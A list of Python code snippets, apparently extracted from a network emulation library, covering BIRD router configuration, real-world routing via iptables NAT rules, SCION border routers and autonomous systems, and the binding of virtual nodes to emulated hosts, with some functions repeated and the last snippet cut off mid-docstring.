  "def copySettings(self, node: Node):\n        \"\"\"!\n        @brief copy settings from another node.\n\n        @param node node to copy from.\n        \"\"\"\n        if node.getDisplayName() != None: self.setDisplayName(node.getDisplayName())\n        if node.getDescription() != None: self.setDescription(node.getDescription())\n        if node.getClasses()     != None: self.setClasses(node.getClasses())\n\n        # TODO:\n        # It is called in Emulator::render\n        # Render steps are (1) Render Base, (2) Get pending targets(vnode name) from Service layers,\n        # (3) Resolve bindings for all vnodes, (4) Applying changes made to virtual physical nodes to real physical nodes,\n        # (5) Render Services.\n        # copySettings is called in the step (4) and the base system is replaced when in the step (5)\n        # if node.getBaseSystem() != None : self.setBaseSystem(node.getClasses())\n\n        for (h, n, p) in node.getPorts(): self.addPort(h, n, p)\n        for p in node.getPersistentStorages(): self.addPersistentStorage(p)\n        for (c, f) in node.getStartCommands(): self.appendStartCommand(c, f)\n        for c in node.getBuildCommands(): self.addBuildCommand(c)\n        for s in node.getSoftware(): self.addSoftware(s)\n\n        for file in node.getFiles():\n            (path, content) = file.get()\n            self.setFile(path, content)",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'Node {}:\\n'.format(self.__name)\n\n        indent += 4\n        out += ' ' * indent\n        out += 'Role: {}\\n'.format(self.__role)\n        out += ' ' * indent\n\n        out += 'Interfaces:\\n'\n        for interface in self.__interfaces:\n            out += interface.print(indent + 4)\n\n        out += ' ' * indent\n        out += 'Files:\\n'\n        for file in self.__files.values():\n            out += file.print(indent + 4)\n\n        out += ' ' * indent\n        out += 'Software:\\n'\n        indent += 4\n        for software in self.__softwares:\n            out += ' ' * indent\n            out += '{}\\n'.format(software)\n        indent -= 4\n\n        out += ' ' * indent\n        out += 'Additional Build Commands:\\n'\n        indent += 4\n        for cmd in self.__build_commands:\n            out += ' ' * indent\n            out += '{}\\n'.format(cmd)\n        indent -= 4\n\n        out += ' ' * indent\n        out += 'Additional Start Commands:\\n'\n        indent += 4\n        for (cmd, fork) in self.__start_commands:\n            out += ' ' * indent\n            out += '{}{}\\n'.format(cmd, ' (fork)' if fork else '')\n        indent -= 4\n\n        return out",
  "def setLoopbackAddress(self, address: str):\n        \"\"\"!\n        @brief Set loopback address.\n\n        @param address address.\n        \"\"\"\n        self.__loopback_address = address",
  "def getLoopbackAddress(self) -> str:\n        \"\"\"!\n        @brief Get loopback address.\n\n        @returns address.\n        \"\"\"\n        return self.__loopback_address",
  "def addProtocol(self, protocol: str, name: str, body: str) -> Router:\n        \"\"\"!\n        @brief Add a new protocol to BIRD on the given node.\n\n        @param protocol protocol type. (e.g., bgp, ospf)\n        @param name protocol name.\n        @param body protocol body.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.appendFile(\"/etc/bird/bird.conf\", RouterFileTemplates[\"protocol\"].format(\n            protocol = protocol,\n            name = name,\n            body = body\n        ))\n\n        return self",
  "def addTablePipe(self, src: str, dst: str = 'master4', importFilter: str = 'none', exportFilter: str = 'all', ignoreExist: bool = True) -> Router:\n        \"\"\"!\n        @brief add a new routing table pipe.\n\n        @param src src table.\n        @param dst (optional) dst table (default: master4)\n        @param importFilter (optional) filter for importing from dst table to src table (default: none)\n        @param exportFilter (optional) filter for exporting from src table to dst table (default: all)\n        @param ignoreExist (optional) assert check if table exists. If true, error is silently discarded.\n\n        @throws AssertionError if pipe between two tables already exist and ignoreExist is False.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        meta = self.getAttribute('__routing_layer_metadata', {})\n        if 'pipes' not in meta: meta['pipes'] = {}\n        pipes = meta['pipes']\n        if src not in pipes: pipes[src] = []\n        if dst in pipes[src]:\n            assert ignoreExist, 'pipe from {} to {} already exist'.format(src, dst)\n            return\n        pipes[src].append(dst)\n        self.appendFile('/etc/bird/bird.conf', RouterFileTemplates[\"pipe\"].format(\n            src = src,\n            dst = dst,\n            importFilter = importFilter,\n            exportFilter = exportFilter\n        ))\n\n        return self",
  "def addTable(self, tableName: str) -> Router:\n        \"\"\"!\n        @brief Add a new routing table to BIRD on the given node.\n\n        @param tableName name of the new table.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        meta = self.getAttribute('__routing_layer_metadata', {})\n        if 'tables' not in meta: meta['tables'] = []\n        tables = meta['tables']\n        if tableName not in tables: self.appendFile('/etc/bird/bird.conf', 'ipv4 table {};\\n'.format(tableName))\n        tables.append(tableName)\n\n        return self",
  "def initRealWorld(self, hideHops: bool):\n        \"\"\"!\n        @brief init RealWorldRouter.\n        \"\"\"\n        if hasattr(self, '__sealed'): return\n        self.__realworld_routes = []\n        self.__sealed = False\n        self.__hide_hops = hideHops\n        self.addSoftware('iptables')",
  "def addRealWorldRoute(self, prefix: str) -> RealWorldRouter:\n        \"\"\"!\n        @brief Add real world route.\n\n        @param prefix prefix.\n\n        @throws AssertionError if sealed.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert not self.__sealed, 'Node sealed.'\n        self.__realworld_routes.append(prefix)\n\n        return self",
  "def getRealWorldRoutes(self) -> List[str]:\n        \"\"\"!\n        @brief Get list of real world prefixes.\n\n        @returns list of prefixes.\n        \"\"\"\n        return self.__realworld_routes",
  "def seal(self):\n        \"\"\"!\n        @brief seal the realworld router.\n\n        Use this method to \"seal\" the router (add static protocol.) No new real\n        world routes can be added once the node is sealed.\n        \"\"\"\n        if self.__sealed: return\n        self.__sealed = True\n        if len(self.__realworld_routes) == 0: return\n        self.setFile('/rw_configure_script', RouterFileTemplates['rw_configure_script'])\n        self.insertStartCommand(0, '/rw_configure_script')\n        self.insertStartCommand(0, 'chmod +x /rw_configure_script')\n        self.addTable('t_rw')\n        statics = '\\n    ipv4 { table t_rw; import all; };\\n    route ' + ' via !__default_gw__!;\\n    route '.join(self.__realworld_routes)\n        statics += ' via !__default_gw__!;\\n'\n        for prefix in self.__realworld_routes:\n            # nat matched only\n            self.appendFile('/rw_configure_script', 'iptables -t nat -A POSTROUTING -d {} -j MASQUERADE\\n'.format(prefix))\n\n            if self.__hide_hops:\n                # remove realworld hops\n                self.appendFile('/rw_configure_script', 'iptables -t mangle -A POSTROUTING -d {} -j TTL --ttl-set 64\\n'.format(prefix))\n\n        self.addProtocol('static', 'real_world', statics)\n        self.addTablePipe('t_rw', 't_bgp', exportFilter = 'filter { bgp_large_community.add(LOCAL_COMM); bgp_local_pref = 40; accept; }')",
  "def print(self, indent: int) -> str:\n        out = super(RealWorldRouter, self).print(indent)\n        indent += 4\n\n        out += ' ' * indent\n        out += 'Real-world prefixes:\\n'\n\n        indent += 4\n        for prefix in self.__realworld_routes:\n            out += ' ' * indent\n            out += '{}\\n'.format(prefix)\n\n\n        return out",
  "def __init__(self):\n        super().__init__()\n        self.initScionRouter()",
  "def initScionRouter(self):\n        self.__interfaces = {}\n        self.__next_port = 50000",
  "def addScionInterface(self, ifid: int, iface: Dict) -> None:\n        \"\"\"!\n        @brief Add a SCION interface to the border router.\n\n        @param ifid Interface ID of the new interface.\n        @param iface Interface definition.\n        \"\"\"\n        assert ifid not in self.__interfaces, f\"interface {ifid} already exists\"\n        self.__interfaces[ifid] = iface",
  "def getScionInterface(self, ifid: int) -> Dict:\n        \"\"\"!\n        @brief Retrieve an existing interface.\n\n        @param ifid Interface ID to look up.\n        @throws AssertionError if the interface does not exist.\n        \"\"\"\n        assert ifid in self.__interfaces, f\"interface {ifid} does not exist\"\n        return self.__interfaces[ifid]",
  "def getScionInterfaces(self) -> Dict[int, Dict]:\n        \"\"\"!\n        @brief Get all border router interfaces.\n        @returns IFIDs and interface declarations for border router.\n        \"\"\"\n        return self.__interfaces",
  "def getNextPort(self) -> int:\n        \"\"\"!\n        @brief Get the next free UDP port. Called during configuration.\n        \"\"\"\n        port = self.__next_port\n        self.__next_port += 1\n        return port",
  "class Action(Enum):\n    \"\"\"!\n    @brief actions to take when a binding matches a node.\n    \"\"\"\n\n    ## pick randomly from the candidates.\n    RANDOM = 0\n\n    ## pick the first candidate.\n    FIRST = 1\n\n    ## pick the last candidate.\n    LAST = 2\n\n    ## create a node matching the given conditions. Note that 'NEW' nodes are\n    # only created during render, and attempt to resolve it beforehand\n    # (like resolvVnode) is not possible.\n    NEW = 3",
  "class Filter(Printable):\n    \"\"\"!\n    @brief the Filter class.\n\n    The filter class is used to define some conditions to narrow down candidates\n    for a binding.\n    \"\"\"\n\n    asn: int\n    nodeName: str\n    ip: str\n    prefix: str\n    allowBound: bool\n    custom: Callable[[str, Node], bool]\n\n    def __init__(\n        self, asn: int = None, nodeName: str = None, ip: str = None,\n        prefix: str = None, custom: Callable[[str, Node], bool] = None,\n        allowBound: bool = False\n    ):\n        \"\"\"!\n        @brief create new filter.\n        \n        If no options are given, the filter matches all nodes in the emulation.\n        If more then one options are given, the options are joined with \"and\"\n        operation - meaning the node must match all given options to be\n        selected.\n\n        @param asn (optional) asn of node. Default to None (any ASN).\n        @param nodeName (optional) name of node. Default to None (any name).\n        @param ip (optional) IP address of node (w/o mask). Default to None (any\n        IP).\n        @param prefix (optional) Prefix range of node's IP address (CIDR).\n        Default to None (any prefix).\n        @param custom (optional) custom test function. Must accepts\n        (virtual_node_name, physical_node_object) as input and returns a bool.\n        Default to None (always allow).\n        @param allowBound (optional) allow re-use bound nodes. Default to false.\n        \"\"\"\n\n        ## asn of node\n        self.asn = asn\n\n        ## name of node\n        self.nodeName = nodeName\n\n        ## ip address of node (w/o mask)\n        self.ip = ip\n\n        ## prefix range of node's IP address\n        self.prefix = prefix\n\n        ## custom test function\n        self.custom = custom\n\n        ## allow re-use already bound nodes\n        self.allowBound = allowBound",
  "class Binding(Printable):\n    \"\"\"!\n    @brief Binding class. \n\n    A binding class defines how to bind virtual nodes to physical nodes.\n    \"\"\"\n\n    source: str\n    action: Action\n    filter: Filter\n\n    def __init__(self, source, action = Action.RANDOM, filter = Filter()):\n        \"\"\"!\n        @brief create new binding.\n\n        @param source virtual node name. can be regexp to match multiple virtual\n        nodes.\n        @param action (optional) candidate selection. Default to random.\n        @param filter (optional) filter. Default to empty filter (all physical\n        nodes).\n        \"\"\"\n\n        ## regexp of virtual node name that should be handled by this binding.\n        self.source = source\n\n        ## candidate selection after the filter completes.\n        self.action = action\n\n        ## physical node filter.\n        self.filter = filter\n\n    def __filterBaseSystemConflict(self, vnode:str, node:Node, emulator:Emulator) -> bool:\n        \"\"\"!\n        @brief filter a base_system conflict between vnode and node when binding. \n\n        @param vnode virtual node name.\n        @param node candidate physical name to bind with vnode.\n        @param emulator emulator instance to get server object by vnode name.\n\n        @returns True if it does not have any conflict.\n        \"\"\"\n        nodeBaseSystem = node.getBaseSystem()\n        server = emulator.getServerByVirtualNodeName(vnode)\n        vnodeBaseSystem = server.getBaseSystem()\n        if nodeBaseSystem == vnodeBaseSystem:\n            return True\n        if BaseSystem.doesAContainB(A=vnodeBaseSystem, B=nodeBaseSystem):\n            return True\n        if BaseSystem.doesAContainB(A=nodeBaseSystem, B=vnodeBaseSystem):\n            server.setBaseSystem(nodeBaseSystem)\n            return True\n        \n        return False\n    \n    def __create(self, emulator: Emulator) -> Node:\n        \"\"\"!\n        @brief create a node matching given condition.\n\n        @returns node created.\n        \"\"\"\n        self.__log('binding: NEW: try to create a node matching filter condition(s)...')\n\n        reg = emulator.getRegistry()\n\n        base = emulator.getLayer('Base')\n\n        f = self.filter\n\n        assert f.custom == None, 'binding: NEW: custom filter function is not supported with NEW action.'\n        assert f.asn == None or f.asn in base.getAsns(), 'binding: NEW: AS{} is set in filter but not in emulator.'.format(f.asn)\n        assert f.ip == None or f.prefix == None, 'binding: NEW: both ip and prefix is set. Please set only one of them.'\n\n        if f.allowBound: self.__log('binding: NEW: WARN: allowBound has not effect when using Action.NEW')\n\n        asn = f.asn\n        netName = None\n\n        # ip is set: find net matching the condition.\n        if f.ip != None:\n            self.__log('binding: NEW: IP {} is given to host: finding networks with this IP in range.'.format(f.ip))\n            for _asn in base.getAsns():\n                hit = False\n                if f.asn != None and f.asn != _asn: continue\n                \n                asObject = base.getAutonomousSystem(_asn)\n                for net in asObject.getNetworks():\n                    netObject = asObject.getNetwork(net)\n\n                    if IPv4Address(f.ip) in netObject.getPrefix():\n                        self.__log('match found: as{}/{}'.format(_asn, net))\n                        asn = _asn\n                        netName = net\n                        hit = True\n                        break\n\n                if hit: break\n        \n        # prefix is set: find net matching the condition\n        if f.prefix != None:\n            self.__log('binding: NEW: Prefix {} is given to host: finding networks in range.'.format(f.prefix))\n\n            for _asn in base.getAsns():\n                hit = False\n                if f.asn != None and f.asn != _asn: continue\n                \n                asObject = base.getAutonomousSystem(_asn)\n                for net in asObject.getNetworks():\n                    netObject = asObject.getNetwork(net)\n\n                    if IPv4Network(f.prefix).overlaps(netObject.getPrefix()):\n                        self.__log('binding: NEW: match found: as{}/{}'.format(_asn, net))\n                        asn = _asn\n                        netName = net\n                        hit = True\n                        break\n\n                if hit: break\n\n        if f.prefix != None or f.ip != None:\n            assert netName != None, 'binding: NEW: cannot satisfy prefix/ip rule set by filter.'\n        \n        # no as selected: randomly choose one\n        if asn == None:\n            asn = random.choice(base.getAsns())\n            self.__log('binding: NEW: asn not set, using random as: {}'.format(asn))\n\n        asObject = base.getAutonomousSystem(asn)\n\n        # no net selected: randomly choose one\n        if netName == None:\n            netName = random.choice(asObject.getNetworks())\n            self.__log('binding: NEW: ip/prefix not set, using random net: as{}/{}'.format(asn, netName))\n\n\n        nodeName = f.nodeName\n        \n        # no nodename given: randomly create one\n        if nodeName == None:\n            nodeName = ''.join(random.choice(string.ascii_lowercase) for i in range(10))\n            self.__log('binding: NEW: nodeName not set, using random name: {}'.format(nodeName))\n\n        self.__log('binding: NEW: creating new host...'.format(nodeName))\n\n        # create the host in as\n        host = asObject.createHost(nodeName)\n\n        # set name servers\n        host.setNameServers(asObject.getNameServers())\n\n        # join net\n        host.joinNetwork(netName, 'auto' if f.ip == None else f.ip)\n\n        # register - usually this is done by AS in configure stage, since we have passed that point, we need to do it ourself.\n        reg.register(str(asn), 'hnode', nodeName, host)\n\n        # configure - usually this is done by AS in configure stage, since we have passed that point, we need to do it ourself.\n        host.configure(emulator)\n\n        return host\n\n\n    def shoudBind(self, vnode: str) -> bool:\n        \"\"\"!\n        @brief test if this binding applies to a virtual node.\n\n        @param vnode name of vnode.\n\n        @returns true if applies, false otherwise.\n        \"\"\"\n        return re.compile(self.source).match(vnode)\n\n    def getCandidate(self, vnode: str, emulator: Emulator, peek: bool = False) -> Node:\n        \"\"\"!\n        @brief get a binding candidate from given emulator. Note that this will\n        make change to the node by adding a \"bound =  true\" attribute to the\n        node object.\n\n        @param vnode name of vnode\n        @param emulator emulator to select candidate from. \n        @param peek (optional) peek mode - ignore bound attribute and don't set\n        it when node is selected.\n\n        @return candidate node, or none if not found.\n        \"\"\"\n        if not self.shoudBind(vnode): return None\n        self.__log('looking for binding for {}'.format(vnode))\n\n        if self.action == Action.NEW:\n            if peek: return None\n\n            node = self.__create(emulator)\n            node.setAttribute('bound', True)\n\n            return node\n            \n        registry = emulator.getRegistry()\n\n        candidates: List[Node] = []\n\n        for (scope, type, name), obj in registry.getAll().items():\n            if type != 'hnode': continue\n            node: Node = obj\n            filter = self.filter\n\n            self.__log('trying node as{}/{}...'.format(scope, name  ))\n\n            if filter.asn != None and node.getAsn() != filter.asn:\n                self.__log('node asn ({}) != filter asn ({}), trying next node.'.format(node.getAsn(), filter.asn))\n                continue\n            \n            if filter.nodeName != None and not re.compile(filter.nodeName).match(name):\n                self.__log('node name ({}) cat\\'t match filter name ({}), trying next node.'.format(name, filter.nodeName))\n                continue\n\n            if filter.ip != None:\n                has_match = False\n                for iface in node.getInterfaces():\n                    if str(iface.getAddress()) == filter.ip:\n                        has_match = True\n                        break\n                if not has_match:\n                    self.__log('node as{}/{} does not have IP {}, trying next node.'.format(scope, name, filter.ip))\n                    continue\n\n            if filter.prefix != None:\n                has_match = False\n                net = IPv4Network(filter.prefix)\n                for iface in node.getInterfaces():\n                    if iface.getAddress() in net.hosts():\n                        has_match = True\n                        break\n                if not has_match:\n                    self.__log('node as{}/{} not in prefix {}, trying next node.'.format(scope, name, filter.prefix))\n                    continue\n\n            if filter.custom != None and not filter.custom(vnode, node):\n                self.__log('custom function returned false for node as{}/{}, trying next node.'.format(scope, name))\n                continue\n\n            if node.hasAttribute('bound') and not filter.allowBound and not peek:\n                self.__log('node as{}/{} is already bound and re-bind is not allowed, trying next node.'.format(scope, name))\n                continue\n            \n            if not self.__filterBaseSystemConflict(vnode, node, emulator):\n                self.__log('node as{}/{} base_system is not compatible'.format(scope, name))\n                continue\n            \n\n            self.__log('node as{}/{} added as candidate. looking for more candidates.'.format(scope, name))\n\n            if self.action == Action.FIRST:\n                self.__log('{} as{}/{}.'.format('peek: picked' if peek else 'bound to', node.getAsn(), node.getName()))\n                if not peek: node.setAttribute('bound', True)\n                return node\n        \n            candidates.append(node)\n\n        if len(candidates) == 0: return None\n\n        node = None\n\n        if self.action == Action.LAST: node = candidates[-1]\n\n        if self.action == Action.RANDOM: node = random.choice(candidates)\n\n        if node != None: \n            self.__log('{} as{}/{}.'.format('peek: picked' if peek else 'bound to', node.getAsn(), node.getName()))\n            if not peek: node.setAttribute('bound', True)\n\n        return node\n\n    def __log(self, message: str):\n        \"\"\"!\n        @brief log to stderr.\n\n        @param message message.\n        \"\"\"\n        print('==== Binding: {}: {}'.format(self.source, message), file=stderr)",
  "def __init__(\n        self, asn: int = None, nodeName: str = None, ip: str = None,\n        prefix: str = None, custom: Callable[[str, Node], bool] = None,\n        allowBound: bool = False\n    ):\n        \"\"\"!\n        @brief create new filter.\n        \n        If no options are given, the filter matches all nodes in the emulation.\n        If more then one options are given, the options are joined with \"and\"\n        operation - meaning the node must match all given options to be\n        selected.\n\n        @param asn (optional) asn of node. Default to None (any ASN).\n        @param nodeName (optional) name of node. Default to None (any name).\n        @param ip (optional) IP address of node (w/o mask). Default to None (any\n        IP).\n        @param prefix (optional) Prefix range of node's IP address (CIDR).\n        Default to None (any prefix).\n        @param custom (optional) custom test function. Must accepts\n        (virtual_node_name, physical_node_object) as input and returns a bool.\n        Default to None (always allow).\n        @param allowBound (optional) allow re-use bound nodes. Default to false.\n        \"\"\"\n\n        ## asn of node\n        self.asn = asn\n\n        ## name of node\n        self.nodeName = nodeName\n\n        ## ip address of node (w/o mask)\n        self.ip = ip\n\n        ## prefix range of node's IP address\n        self.prefix = prefix\n\n        ## custom test function\n        self.custom = custom\n\n        ## allow re-use already bound nodes\n        self.allowBound = allowBound",
  "def __init__(self, source, action = Action.RANDOM, filter = Filter()):\n        \"\"\"!\n        @brief create new binding.\n\n        @param source virtual node name. can be regexp to match multiple virtual\n        nodes.\n        @param action (optional) candidate selection. Default to random.\n        @param filter (optional) filter. Default to empty filter (all physical\n        nodes).\n        \"\"\"\n\n        ## regexp of virtual node name that should be handled by this binding.\n        self.source = source\n\n        ## candidate selection after the filter completes.\n        self.action = action\n\n        ## physical node filter.\n        self.filter = filter",
  "def __filterBaseSystemConflict(self, vnode:str, node:Node, emulator:Emulator) -> bool:\n        \"\"\"!\n        @brief filter a base_system conflict between vnode and node when binding. \n\n        @param vnode virtual node name.\n        @param node candidate physical name to bind with vnode.\n        @param emulator emulator instance to get server object by vnode name.\n\n        @returns True if it does not have any conflict.\n        \"\"\"\n        nodeBaseSystem = node.getBaseSystem()\n        server = emulator.getServerByVirtualNodeName(vnode)\n        vnodeBaseSystem = server.getBaseSystem()\n        if nodeBaseSystem == vnodeBaseSystem:\n            return True\n        if BaseSystem.doesAContainB(A=vnodeBaseSystem, B=nodeBaseSystem):\n            return True\n        if BaseSystem.doesAContainB(A=nodeBaseSystem, B=vnodeBaseSystem):\n            server.setBaseSystem(nodeBaseSystem)\n            return True\n        \n        return False",
  "def __create(self, emulator: Emulator) -> Node:\n        \"\"\"!\n        @brief create a node matching given condition.\n\n        @returns node created.\n        \"\"\"\n        self.__log('binding: NEW: try to create a node matching filter condition(s)...')\n\n        reg = emulator.getRegistry()\n\n        base = emulator.getLayer('Base')\n\n        f = self.filter\n\n        assert f.custom == None, 'binding: NEW: custom filter function is not supported with NEW action.'\n        assert f.asn == None or f.asn in base.getAsns(), 'binding: NEW: AS{} is set in filter but not in emulator.'.format(f.asn)\n        assert f.ip == None or f.prefix == None, 'binding: NEW: both ip and prefix is set. Please set only one of them.'\n\n        if f.allowBound: self.__log('binding: NEW: WARN: allowBound has not effect when using Action.NEW')\n\n        asn = f.asn\n        netName = None\n\n        # ip is set: find net matching the condition.\n        if f.ip != None:\n            self.__log('binding: NEW: IP {} is given to host: finding networks with this IP in range.'.format(f.ip))\n            for _asn in base.getAsns():\n                hit = False\n                if f.asn != None and f.asn != _asn: continue\n                \n                asObject = base.getAutonomousSystem(_asn)\n                for net in asObject.getNetworks():\n                    netObject = asObject.getNetwork(net)\n\n                    if IPv4Address(f.ip) in netObject.getPrefix():\n                        self.__log('match found: as{}/{}'.format(_asn, net))\n                        asn = _asn\n                        netName = net\n                        hit = True\n                        break\n\n                if hit: break\n        \n        # prefix is set: find net matching the condition\n        if f.prefix != None:\n            self.__log('binding: NEW: Prefix {} is given to host: finding networks in range.'.format(f.prefix))\n\n            for _asn in base.getAsns():\n                hit = False\n                if f.asn != None and f.asn != _asn: continue\n                \n                asObject = base.getAutonomousSystem(_asn)\n                for net in asObject.getNetworks():\n                    netObject = asObject.getNetwork(net)\n\n                    if IPv4Network(f.prefix).overlaps(netObject.getPrefix()):\n                        self.__log('binding: NEW: match found: as{}/{}'.format(_asn, net))\n                        asn = _asn\n                        netName = net\n                        hit = True\n                        break\n\n                if hit: break\n\n        if f.prefix != None or f.ip != None:\n            assert netName != None, 'binding: NEW: cannot satisfy prefix/ip rule set by filter.'\n        \n        # no as selected: randomly choose one\n        if asn == None:\n            asn = random.choice(base.getAsns())\n            self.__log('binding: NEW: asn not set, using random as: {}'.format(asn))\n\n        asObject = base.getAutonomousSystem(asn)\n\n        # no net selected: randomly choose one\n        if netName == None:\n            netName = random.choice(asObject.getNetworks())\n            self.__log('binding: NEW: ip/prefix not set, using random net: as{}/{}'.format(asn, netName))\n\n\n        nodeName = f.nodeName\n        \n        # no nodename given: randomly create one\n        if nodeName == None:\n            nodeName = ''.join(random.choice(string.ascii_lowercase) for i in range(10))\n            self.__log('binding: NEW: nodeName not set, using random name: {}'.format(nodeName))\n\n        self.__log('binding: NEW: creating new host...'.format(nodeName))\n\n        # create the host in as\n        host = asObject.createHost(nodeName)\n\n        # set name servers\n        host.setNameServers(asObject.getNameServers())\n\n        # join net\n        host.joinNetwork(netName, 'auto' if f.ip == None else f.ip)\n\n        # register - usually this is done by AS in configure stage, since we have passed that point, we need to do it ourself.\n        reg.register(str(asn), 'hnode', nodeName, host)\n\n        # configure - usually this is done by AS in configure stage, since we have passed that point, we need to do it ourself.\n        host.configure(emulator)\n\n        return host",
  "def shoudBind(self, vnode: str) -> bool:\n        \"\"\"!\n        @brief test if this binding applies to a virtual node.\n\n        @param vnode name of vnode.\n\n        @returns true if applies, false otherwise.\n        \"\"\"\n        return re.compile(self.source).match(vnode)",
  "def getCandidate(self, vnode: str, emulator: Emulator, peek: bool = False) -> Node:\n        \"\"\"!\n        @brief get a binding candidate from given emulator. Note that this will\n        make change to the node by adding a \"bound =  true\" attribute to the\n        node object.\n\n        @param vnode name of vnode\n        @param emulator emulator to select candidate from. \n        @param peek (optional) peek mode - ignore bound attribute and don't set\n        it when node is selected.\n\n        @return candidate node, or none if not found.\n        \"\"\"\n        if not self.shoudBind(vnode): return None\n        self.__log('looking for binding for {}'.format(vnode))\n\n        if self.action == Action.NEW:\n            if peek: return None\n\n            node = self.__create(emulator)\n            node.setAttribute('bound', True)\n\n            return node\n            \n        registry = emulator.getRegistry()\n\n        candidates: List[Node] = []\n\n        for (scope, type, name), obj in registry.getAll().items():\n            if type != 'hnode': continue\n            node: Node = obj\n            filter = self.filter\n\n            self.__log('trying node as{}/{}...'.format(scope, name  ))\n\n            if filter.asn != None and node.getAsn() != filter.asn:\n                self.__log('node asn ({}) != filter asn ({}), trying next node.'.format(node.getAsn(), filter.asn))\n                continue\n            \n            if filter.nodeName != None and not re.compile(filter.nodeName).match(name):\n                self.__log('node name ({}) cat\\'t match filter name ({}), trying next node.'.format(name, filter.nodeName))\n                continue\n\n            if filter.ip != None:\n                has_match = False\n                for iface in node.getInterfaces():\n                    if str(iface.getAddress()) == filter.ip:\n                        has_match = True\n                        break\n                if not has_match:\n                    self.__log('node as{}/{} does not have IP {}, trying next node.'.format(scope, name, filter.ip))\n                    continue\n\n            if filter.prefix != None:\n                has_match = False\n                net = IPv4Network(filter.prefix)\n                for iface in node.getInterfaces():\n                    if iface.getAddress() in net.hosts():\n                        has_match = True\n                        break\n                if not has_match:\n                    self.__log('node as{}/{} not in prefix {}, trying next node.'.format(scope, name, filter.prefix))\n                    continue\n\n            if filter.custom != None and not filter.custom(vnode, node):\n                self.__log('custom function returned false for node as{}/{}, trying next node.'.format(scope, name))\n                continue\n\n            if node.hasAttribute('bound') and not filter.allowBound and not peek:\n                self.__log('node as{}/{} is already bound and re-bind is not allowed, trying next node.'.format(scope, name))\n                continue\n            \n            if not self.__filterBaseSystemConflict(vnode, node, emulator):\n                self.__log('node as{}/{} base_system is not compatible'.format(scope, name))\n                continue\n            \n\n            self.__log('node as{}/{} added as candidate. looking for more candidates.'.format(scope, name))\n\n            if self.action == Action.FIRST:\n                self.__log('{} as{}/{}.'.format('peek: picked' if peek else 'bound to', node.getAsn(), node.getName()))\n                if not peek: node.setAttribute('bound', True)\n                return node\n        \n            candidates.append(node)\n\n        if len(candidates) == 0: return None\n\n        node = None\n\n        if self.action == Action.LAST: node = candidates[-1]\n\n        if self.action == Action.RANDOM: node = random.choice(candidates)\n\n        if node != None: \n            self.__log('{} as{}/{}.'.format('peek: picked' if peek else 'bound to', node.getAsn(), node.getName()))\n            if not peek: node.setAttribute('bound', True)\n\n        return node",
  "def __log(self, message: str):\n        \"\"\"!\n        @brief log to stderr.\n\n        @param message message.\n        \"\"\"\n        print('==== Binding: {}: {}'.format(self.source, message), file=stderr)",
  "class NetworkType(Enum):\n    \"\"\"!\n    @brief Network types enum.\n    \"\"\"\n\n    ## Public internet exchange network\n    InternetExchange = \"Internet Exchange Network\"\n\n    ## Private links networks. OSPF routers and IBGP runs on this type of\n    #  networks.\n    Local = \"Local Network\"\n\n    ## Bridge networks. This type of network enable access to the real world.\n    Bridge = \"Bridge Network\"\n\n    ## XC network. This type of network connects two nodes directly.\n    CrossConnect = \"Cross Connect\"",
  "class NodeRole(Enum):\n    \"\"\"!\n    @brief Node roles enum.\n    \"\"\"\n\n    ## Host node.\n    Host = \"Host\"\n\n    ## Router node.\n    Router = \"Router\"\n\n    ## Route served node.\n    RouteServer = \"Route Server\"",
  "class IA(NamedTuple):\n    \"\"\"!\n    @brief ISD-ASN identifier for a SCION AS.\n    \"\"\"\n    isd: int\n    asn: int\n\n    def __str__(self):\n        return f\"{self.isd}-{self.asn}\"",
  "class ScionAutonomousSystem(AutonomousSystem):\n    \"\"\"!\n    @brief SCION-enabled AutonomousSystem.\n\n    This class represents an autonomous system with support for SCION.\n    \"\"\"\n\n    __keys: Optional[Tuple[str, str]]\n    __attributes: Dict[int, Set]         # Set of AS attributes per ISD\n    __mtu: Optional[int]                 # Minimum MTU in the AS's internal networks\n    __control_services: Dict[str, Node]\n    __next_ifid: int                     # Next IFID assigned to a link\n\n    def __init__(self, asn: int, subnetTemplate: str = \"10.{}.0.0/16\"):\n        \"\"\"!\n        @copydoc AutonomousSystem\n        \"\"\"\n        super().__init__(asn, subnetTemplate)\n        self.__control_services = {}\n        self.__keys = None\n        self.__attributes = defaultdict(set)\n        self.__mtu = None\n        self.__next_ifid = 1\n\n    def registerNodes(self, emulator: Emulator):\n        \"\"\"!\n        @copydoc AutonomousSystem.registerNodes()\n        \"\"\"\n        super().registerNodes(emulator)\n        reg = emulator.getRegistry()\n        asn = str(self.getAsn())\n        for (key, val) in self.__control_services.items(): reg.register(asn, 'csnode', key, val)\n\n    def configure(self, emulator: Emulator):\n        \"\"\"!\n        @copydoc AutonomousSystem.configure()\n        \"\"\"\n        super().configure(emulator)\n\n        for cs in self.__control_services.values():\n            if len(cs.getNameServers()) == 0:\n                cs.setNameServers(self.getNameServers())\n            cs.configure(emulator)\n\n        # Set MTU to the smallest MTU of all AS-internal networks\n        reg = emulator.getRegistry()\n        self.__mtu = min(net.getMtu() for net in reg.getByType(str(self.getAsn()), 'net'))\n\n        # Create secret keys\n        self.__keys = (\n            base64.b64encode(os.urandom(16)).decode(),\n            base64.b64encode(os.urandom(16)).decode())\n\n    def getNextIfid(self) -> int:\n        \"\"\"!\n        @brief Get next unused IFID. Called during configuration.\n        \"\"\"\n        ifid = self.__next_ifid\n        self.__next_ifid += 1\n        return ifid\n\n    def getSecretKeys(self) -> Tuple[str, str]:\n        \"\"\"!\n        @brief Get AS secret keys.\n        \"\"\"\n        assert self.__keys is not None, \"AS is not configured yet\"\n        return self.__keys\n\n    def setAsAttributes(self, isd: int, attributes: Iterable[str]) -> ScionAutonomousSystem:\n        \"\"\"!\n        @brief Set an AS's attributes. Called during configuration.\n\n        @param isd To which ISD the attributes apply.\n        @param attributes List of attributes. Replaces any attributes previously configured.\n        @returns self\n        \"\"\"\n        self.__attributes[isd] = set(attributes)\n        return self\n\n    def getAsAttributes(self, isd: int) -> List[str]:\n        \"\"\"!\n        @brief Get all AS attributes.\n\n        @param isd To which ISD the attributes apply.\n        @returns List of attributes.\n        \"\"\"\n        return list(self.__attributes[isd])\n\n    def getTopology(self, isd: int) -> Dict:\n        \"\"\"!\n        @brief Create the AS topology definition.\n\n        Called during rendering.\n\n        @param isd ISD for which to generate the AS topology.\n        @return Topology dictionary (can be serialized to 